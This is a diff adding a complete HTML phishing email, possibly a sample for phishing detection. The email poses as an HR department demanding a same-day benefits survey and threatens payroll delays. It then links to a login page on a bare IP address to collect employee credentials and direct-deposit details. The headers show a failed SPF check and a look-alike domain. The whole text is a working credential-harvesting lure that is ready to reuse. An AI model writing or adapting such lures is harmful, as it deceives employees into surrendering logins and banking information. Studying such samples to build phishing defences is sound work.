@@ -1,0 +1,51 @@
+From: hr-department@company-portal.net
+To: employee@company.com
+Subject: Mandatory: Employee Benefits Survey - Complete by EOD
+Date: Tue, 16 Jan 2026 14:15:32 +0000
+Message-ID: <20260116141532.77889@company-portal.net>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Originating-IP: [195.74.76.222]
+Authentication-Results: spf=fail smtp.mailfrom=company-portal.net
+
+<html>
+<body style="font-family: Calibri, Arial;">
+<div style="max-width: 700px; border: 1px solid #ddd; padding: 20px;">
+
+<h3 style="color: #c00;">ACTION REQUIRED: Annual Benefits Survey</h3>
+
+<p>Dear Employee,</p>
+
+<p>As part of our annual review process, all employees must complete the 2026 Benefits and Compensation Survey by end of day today.</p>
+
+<p><b>Survey Topics Include:</b></p>
+<ul>
+<li>Health Insurance Preferences</li>
+<li>401(k) Contribution Updates</li>
+<li>Direct Deposit Verification</li>
+<li>Emergency Contact Information</li>
+</ul>
+
+<p style="background: #fff3cd; padding: 10px; border-left: 4px solid #ffc107;">
+<b>⚠️ Warning:</b> Failure to complete this survey will result in benefits being assigned to default options and may delay your payroll processing.
+</p>
+
+<p><a href="http://195.74.76.222/portal/benefits-survey/employee-login.php" style="background: #007bff; color: white; padding: 12px 24px; text-decoration: none; display: inline-block; margin: 10px 0;">Access Survey Portal</a></p>
+
+<p>You will need to authenticate with your employee credentials.</p>
+
+<p>If you have questions, contact HR at ext. 5500.</p>
+
+<p>Best regards,<br>
+<b>Human Resources Department</b><br>
+Internal Employee Portal<br>
+portal.company-portal.net</p>
+
+<hr>
+<p style="font-size: 10px; color: #888;">
+This email was sent from an automated system. Portal Session ID: PRT-5f8a2b9c<br>
+Gateway IP: 195.74.76.222 | Mail Server: mx-relay.company-portal.net
+</p>
+</div>
+</body>
+</html>
